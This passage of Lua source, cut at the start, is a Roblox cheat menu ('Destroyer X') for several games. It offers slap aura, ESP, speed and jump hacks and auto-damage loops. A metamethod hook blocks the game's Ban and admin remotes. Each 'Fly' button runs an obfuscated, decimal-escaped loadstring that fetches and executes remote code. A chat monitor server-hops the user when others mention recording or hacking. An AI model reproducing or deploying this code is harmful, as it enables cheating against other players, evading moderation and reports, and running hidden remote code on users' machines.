        Icon = "rbxassetid://7733964719",
        PremiumOnly = false
})

-- Buttons & Toggles

TabMainRoyal:AddToggle({
  Name = "Slap Aura",
  Default = false,
  Callback = function(Value)
		SlapAuraPlr = Value
                while SlapAuraPlr do
                  pcall(function()
    for i,v in pairs(game.Players:GetChildren()) do
        if v ~= game.Players.LocalPlayer and v.Character then
            if v.Character:FindFirstChild("Dead") == nil and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:WaitForChild("inMatch").Value == true and game.Players.LocalPlayer.Character:WaitForChild("inMatch").Value == true then
                game.ReplicatedStorage.Events.Slap:FireServer(v.Character:WaitForChild("HumanoidRootPart"))
            end
        end
    end
end)
task.wait()
end
end
})

TabMainRoyal:AddToggle({
    Name = "Anti-Acid",
    Default = false,
    Callback = function(Value)
        AntiAcid = Value
        if platform then
            platform.CanCollide = AntiAcid
        end
    end
})

-- Anti Acid 

local platformSize = Vector3.new(1000, 5, 1000)
local transparency = 1

local cframe = CFrame.new(-18.1736774, 8.48464108, -702.861511, -0.123709433, 0, 0.992318571, 0, 1.00000012, 0, -0.992318571, 0, -0.123709433)

local function createPlatform()
    platform = Instance.new("Part")
    platform.Size = platformSize
    platform.Anchored = true
    platform.Transparency = transparency
    platform.BrickColor = BrickColor.new("Medium stone grey")
    platform.CFrame = cframe
    platform.CanCollide = false  -- Default to false
    platform.Parent = game.Workspace
end

-- Create the platform
createPlatform()

TabMainRoyal:AddButton({
  Name = "Fly Script (Made by me_ozone)",
  Callback = function()
  loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end
})

TabMiscRoyal:AddTextbox({
	Name = "WalkSpeed",
	Default = "Number",
	TextDisappear = false,
	Callback = function(Value)
SpeedSetRoyal = Value
	end	  
}) 
TabMiscRoyal:AddToggle({
	Name = "Set Speed",
Default = false,
	Callback = function(Value)
SpeedFastSet = Value
while SpeedFastSet do
local player = game.Players.LocalPlayer
local novaVelocidade = SpeedSetRoyal

if player then
    local character = player.Character or player.CharacterAdded:Wait()
    if character then
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.WalkSpeed = novaVelocidade
    end
end
wait(0.1)
end
  	end 
})
TabMiscRoyal:AddParagraph("Chain Answers", "(36 x 2) ÷ 12 = 6 ;   80 + 0 - 8 + 15 - (85) = 2 ;   9(52 ÷ 3) - 150 = 6 ;  √64 - 3 + 2 =  7 ;   (690 - 685) + (42-39) = 8 ; ( 36 x 2 ) ÷ 12 = 6;  16 x 63 - 1006 = 2;  (61 x 2)-(38 x 3 ) = 8;   9'2(6 x 48) - 23,326 = 2;   78 x 3 -140+32-123 = 3;  185,634 - 185,629 + 185,632 -185, 633 = 4;  18 x 18 - 18 + 18 -321 = 3 ; 17^2 - 286 = 3")

TabMainRoyal:AddButton({
  Name = "Leave Bus",
  Callback = function()
    game:GetService("ReplicatedStorage").Events.BusJumping:FireServer()
repeat task.wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("JumpPrompt")
game.Players.LocalPlayer.PlayerGui.JumpPrompt:Destroy()
end
})


TabMiscRoyal:AddTextbox({
	Name = "Jumppower",
	Default = "Number",
	TextDisappear = false,
	Callback = function(Value)
JumpSetRoyal = Value
	end	  
})


TabMiscRoyal:AddToggle({
	Name = "Set Jumppower",
	Default = false,
	Callback = function(Value)
SetFastJump = Value
while SetFastJump do
local player = game.Players.LocalPlayer
local newJumpPower = JumpSetRoyal

if player then
    local character = player.Character or player.CharacterAdded:Wait()
    if character then
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.JumpPower = newJumpPower
    end
end
wait(0.1)
 end
end    
})



local EspOnR = false

local function calculateDistance(point1, point2)
    return (point1 - point2).magnitude
end

local function showPlayerPositions()
    local localPlayer = game.Players.LocalPlayer
    if not localPlayer.Character or not localPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return
    end
    local localPosition = localPlayer.Character.HumanoidRootPart.Position
    
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local playerPosition = player.Character.HumanoidRootPart.Position
            local distance = calculateDistance(localPosition, playerPosition)
            
            local tag = player.Character:FindFirstChild("DistanceTag")
            if not tag then
                tag = Instance.new("BillboardGui")
                tag.Name = "DistanceTag"
                tag.Parent = player.Character
                tag.Size = UDim2.new(0, 150, 0, 50)
                tag.StudsOffset = Vector3.new(0, 3, 0)
                tag.AlwaysOnTop = true
                
                local textLabel = Instance.new("TextLabel")
                textLabel.Name = "TextLabel"
                textLabel.Parent = tag
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                textLabel.BackgroundTransparency = 0.5
                textLabel.BorderSizePixel = 0
                textLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                textLabel.TextScaled = true
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.TextXAlignment = Enum.TextXAlignment.Center
                textLabel.TextYAlignment = Enum.TextYAlignment.Center
                
                local uicorner = Instance.new("UICorner")
                uicorner.CornerRadius = UDim.new(0, 10)
                uicorner.Parent = textLabel
            end
            
            tag.TextLabel.Text = player.Name .. "\n" .. string.format("%.2f meters", distance)
            tag.Enabled = EspOnR  -- Enable or disable the tag based on EspOn
        end
    end
end

game:GetService("RunService").Heartbeat:Connect(function()
    showPlayerPositions()
end)

TabMainRoyal:AddToggle({
    Name = "ESP Players",
    Default = false,
    Callback = function(Value)
        EspOnR = Value
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Character then
                local tag = player.Character:FindFirstChild("DistanceTag")
                if tag then
                    tag.Enabled = EspOnR  -- Update visibility based on the toggle
                end
            end
        end
    end
})


TabInfoRoyal:AddLabel("Update Destroyer X ; Improved some stuff.")

elseif game.PlaceId == 13833961666 then
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Destroyer X | Rob Fight ", HidePremium = false, IntroEnabled = true, IntroText = "Dest Rob Fight", IntroIcon = "rbxassetid://17748409757"  ,     Icon = "rbxassetid://17748409757", SaveConfig = true, ConfigFolder = "DestroyerXStaff"})

--Anti Ban (Credits to GiangMc)--

local Namecall
Namecall = hookmetamethod(game, "__namecall", function(self, ...)
   if getnamecallmethod() == "FireServer" and tostring(self) == "Ban" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "WalkSpeedChanged" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "AdminGUI" then
       return
   end
   return Namecall(self, ...)
end)



-- Tabs
local TabMainRob = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7733960981",
        PremiumOnly = false
})


TabMainRob:AddToggle({
	Name = "Auto Slap Boss",
	Default = false,
	Callback = function(Value)
AutoBossDmg = Value
while AutoBossDmg do
  workspace:WaitForChild("bobBoss"):WaitForChild("DamageEvent"):FireServer()
  wait(0.01)
  end
end
})

TabMainRob:AddToggle({
	Name = "Auto Slap Minions (Tycoon)",
	Default = false,
	Callback = function(Value)
_G.AutoMinions = Value
if game.Players.LocalPlayer.leaderstats.Glove.Value == "Tycoon" then
while _G.AutoMinions do
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GeneralHit = ReplicatedStorage:WaitForChild("GeneralHit")


for _, bobClone in pairs(workspace:GetChildren()) do
    if bobClone.Name == "BobClone" and bobClone:FindFirstChild("Torso") then
        local torso = bobClone:FindFirstChild("Torso")
        
        local args = { torso }
        GeneralHit:FireServer(unpack(args))
    end
end
wait(0.1)
 end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "God's Hand" then
while _G.AutoMinions do
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GodHit = ReplicatedStorage:WaitForChild("Godshand")


for _, bobClone in pairs(workspace:GetChildren()) do
    if bobClone.Name == "BobClone" and bobClone:FindFirstChild("Torso") then
        local torso = bobClone:FindFirstChild("Torso")
        
        local args = { torso }
        GodHit:FireServer(unpack(args))
    end
end
wait(0.1)
 end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Killstreak" then
while _G.AutoMinions do
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Killhit = ReplicatedStorage:WaitForChild("KSHit")


for _, bobClone in pairs(workspace:GetChildren()) do
    if bobClone.Name == "BobClone" and bobClone:FindFirstChild("Torso") then
        local torso = bobClone:FindFirstChild("Torso")
        
        local args = { torso }
        Killhit:FireServer(unpack(args))
    end
end
wait(0.1)
 end
elseif game.Players.LocalPlayer.leaderstats.Glove.Value == "Reaper" then
while _G.AutoMinions do
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReapHit = ReplicatedStorage:WaitForChild("ReaperHit")


for _, bobClone in pairs(workspace:GetChildren()) do
    if bobClone.Name == "BobClone" and bobClone:FindFirstChild("Torso") then
        local torso = bobClone:FindFirstChild("Torso")
        
        local args = { torso }
        ReapHit:FireServer(unpack(args))
    end
end
wait(0.1)
    end
  end 
end
})
TabMainRob:AddButton({
  Name = "Fly Script (Made by me_ozone)",
  Callback = function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end
})



TabMainRob:AddToggle({
  Name = "Auto Click Tycoon Button",
  Default = false,
  Callback = function(Value)
TycoonClick = Value
while TycoonClick do
for _, player in ipairs(game.Players:GetPlayers()) do
    local playerName = player.Name
    local tycoonName = "ÅTycoon" .. playerName
    local tycoon = game.Workspace:FindFirstChild(tycoonName)

    if tycoon then
        local clickPart = tycoon:FindFirstChild("Click")
        if clickPart and clickPart:FindFirstChild("ClickDetector") then
            fireclickdetector(clickPart.ClickDetector)
        else
            warn("Click part or ClickDetector not found for " .. tycoonName)
        end
    else
        warn("Tycoon not found for " .. playerName)
    end
    end
wait(0.1)
  end
end
})

local PlayerCounting1 = TabMainRob:AddLabel("Players in the server: " .. #game.Players:GetPlayers())



TabMainRob:AddButton({
  Name = "Anti-Lag",
  Callback = function()
    local function disableVFX()
    local player = game.Players.LocalPlayer

    local function disableEffects(object)
        for _, descendant in ipairs(object:GetDescendants()) do
            if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Light") then
                descendant.Enabled = false
            elseif descendant:IsA("Beam") or descendant:IsA("Sparkles") or descendant:IsA("Fire") or descendant:IsA("Smoke") or descendant:IsA("Explosion") then
                descendant:Destroy()
            end

            if descendant:IsA("BasePart") and descendant.Material == Enum.Material.Neon then
                descendant.Material = Enum.Material.SmoothPlastic
            end

            if descendant:IsA("Texture") or descendant:IsA("Decal") then
                descendant:Destroy()
            end

            if descendant:IsA("SurfaceAppearance") then
                descendant:Destroy()
            end
        end
    end

    if player.Character then
        disableEffects(player.Character)
    end

    player.CharacterAdded:Connect(function(character)
        disableEffects(character)
    end)

    disableEffects(game.Workspace)
end

disableVFX()

local function removeTextures()
    for _, obj in ipairs(game.Workspace:GetDescendants()) do
        if obj:IsA("Texture") or obj:IsA("Decal") then
            obj:Destroy()
        end
    end
end

removeTextures()

game.Workspace.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("ParticleEmitter") or descendant:IsA("Trail") or descendant:IsA("Light") then
        descendant.Enabled = false
    elseif descendant:IsA("Beam") or descendant:IsA("Sparkles") or descendant:IsA("Fire") or descendant:IsA("Smoke") or descendant:IsA("Explosion") then
        descendant:Destroy()
    end

    if descendant:IsA("BasePart") and descendant.Material == Enum.Material.Neon then
        descendant.Material = Enum.Material.SmoothPlastic
    end

    if descendant:IsA("Texture") or descendant:IsA("Decal") then
        descendant:Destroy()
    end

    if descendant:IsA("SurfaceAppearance") then
        descendant:Destroy()
    end
end)

game.Players.PlayerAdded:Connect(function(newPlayer)
    newPlayer.CharacterAdded:Connect(function(character)
        disableEffects(character)
    end)
end)
    end
})


TabMainRob:AddToggle({
  Name = "Info Script",
  Default = true,
  Callback = function(Value)
PlayerCountRob = Value
if Value == PlayerCountRob then
game:GetService("RunService").RenderStepped:Connect(function()
PlayerCounting1:Set("Players in the server: " .. #game.Players:GetPlayers())
end)
else
  print("Info Off")
 end
end
})


elseif game.PlaceId == 1234567890 then
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Destroyer X | Null Zone ", HidePremium = false, IntroEnabled = true, IntroText = "Dest Null Zone", IntroIcon = "rbxassetid://17748409757"  ,     Icon = "rbxassetid://17748409757", SaveConfig = true, ConfigFolder = "DestroyerXStaff"})

--Anti Ban (Credits to GiangMc)--

local Namecall
Namecall = hookmetamethod(game, "__namecall", function(self, ...)
   if getnamecallmethod() == "FireServer" and tostring(self) == "Ban" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "WalkSpeedChanged" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "AdminGUI" then
       return
   end
   return Namecall(self, ...)
end)



-- Tabs
local TabMainNull = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7733960981",
        PremiumOnly = false
})

TabMainNull:AddButton({
  Name = "Collect Plushie",
  Callback = function()
fireclickdetector(workspace._ugcQuestObjectBobPlushie.ClickDetector)
end
})

TabMainNull:AddTextbox({
	Name = "WalkSpeed",
	Default = "16",
	TextDisappear = false,
	Callback = function(Value)
SpeedSetN = Value
	end	  
})

TabMainNull:AddToggle({
	Name = "Set Speed",
Default = false,
	Callback = function(Value)
SpeedFastSetN = Value
while SpeedFastSetN do
local player = game.Players.LocalPlayer
local novaVelocidade = SpeedSetN

if player then
    local character = player.Character or player.CharacterAdded:Wait()
    if character then
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.WalkSpeed = novaVelocidade
    end
end
wait(0.1)
end
  	end 
})

TabMainNull:AddTextbox({
	Name = "Jumppower",
	Default = "16",
	TextDisappear = false,
	Callback = function(Value)
JumpSetN = Value
	end	  
})


TabMainNull:AddToggle({
	Name = "Set Jumppower",
	Default = false,
	Callback = function(Value)
SetFastJumpN = Value
while SetFastJumpN do
local player = game.Players.LocalPlayer
local newJumpPower = JumpSetN

if player then
    local character = player.Character or player.CharacterAdded:Wait()
    if character then
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.JumpPower = newJumpPower
    end
end
wait(0.1)
 end
end    
})

TabMainNull:AddButton({
  Name = "Fly",
  Callback = function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end
})
TabMainNull:AddToggle({
  Name = "Anti-Null",
  Callback = function()
    _G.AntiNullOn = Value
while G.AntiNullOn do
function getNil(name, class)
    for _, v in next, getnilinstances() do
        if v.ClassName == class and v.Name == name then
            return v
        end
    end
end


for _, instance in pairs(game.Workspace:GetDescendants()) do

    if instance:IsA("MeshPart") and instance.Name == "Body" then

        local args = {
            [1] = instance
        }

        game:GetService("ReplicatedStorage"):WaitForChild("b"):FireServer(unpack(args))
    end
end
task.wait()
   end
end
})

end



local coreGuiService = game:GetService("CoreGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = coreGuiService

local button = Instance.new("ImageButton")
button.Image = "rbxassetid://17748339625"
button.Size = UDim2.new(0, 50, 0, 50)
button.Position = UDim2.new(0, 771, 0, 10)
button.AnchorPoint = Vector2.new(0.5, 0)
button.BackgroundColor3 = Color3.new(0, 0, 0)
button.BorderSizePixel = 0
button.Draggable = false

button.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10) 
corner.Parent = button

local function toggleFramesVisibility()
    local orionGui = coreGuiService:FindFirstChild("Orion")
    if orionGui then
        local frames = orionGui:GetChildren()
        local frameCount = 0
        
        for _, frame in ipairs(frames) do
            if frame:IsA("Frame") and frame.Name == "Frame" then
                frameCount = frameCount + 1
                frame.Visible = not frame.Visible
            end
        end
        
        if frameCount == 0 then
            print("v")
        end
    else
        print("v")
    end
end

button.MouseButton1Click:Connect(toggleFramesVisibility)




local blockedWords = {
    "rec", "recording", "recorded", "hacker", "hack", "grava", "report on dc", 
    "record this guy", "Hacker", "Hacking", "Grava", "script", 
    "scripter", "Scripter", "Script", "Exploit", "Exploiter", "exploit", 
    "exploiter", "exploiting"
}


local function checkChat(message)
    local lowerMessage = string.lower(message)
    for _, word in ipairs(blockedWords) do
        if string.find(lowerMessage, word) then


local ServerHOP = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local TweenService = game:GetService("TweenService")



ServerHOP.Name = "ServerHOP"
ServerHOP.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ServerHOP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ServerHOP.ResetOnSpawn = false

ImageLabel.Parent = ServerHOP
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
ImageLabel.Size = UDim2.new(0, 478, 0, 276)
ImageLabel.Image = "rbxassetid://17778539869"

UICorner.Parent = ImageLabel


local function OscillateTransparency(imageLabel, duration, totalDuration)
    local elapsedTime = 0
    local interval = duration / 2

    while elapsedTime < totalDuration do

        local tweenInfo = TweenInfo.new(interval, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
        local goal = {ImageTransparency = 0.5}
        local tween = TweenService:Create(imageLabel, tweenInfo, goal)
        tween:Play()
        tween.Completed:Wait()
        elapsedTime = elapsedTime + interval

        if elapsedTime >= totalDuration then break end


        goal = {ImageTransparency = 0}
        tween = TweenService:Create(imageLabel, tweenInfo, goal)
        tween:Play()
        tween.Completed:Wait()
        elapsedTime = elapsedTime + interval
    end
end


OscillateTransparency(ImageLabel, 1, 3)
wait(1)
local serverList = {}
for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
    if v.playing and type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
        serverList[#serverList + 1] = v.id
    end
end

if #serverList > 0 then
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, serverList[math.random(1, #serverList)])
end
            return true
        end
    end
    return false
end


local function monitorPlayer(player)
    player.Chatted:Connect(function(message)
        if checkChat(message) then
            wait(1) 
        end
    end)
end


while true do
  if AntiRec then
    for _, player in ipairs(game.Players:GetPlayers()) do
        if not player:FindFirstChild("ChatMonitorConnected") then
            local tag = Instance.new("BoolValue")
            tag.Name = "ChatMonitorConnected"
            tag.Parent = player
            monitorPlayer(player)
        end
    end
  end
     wait(1) 
end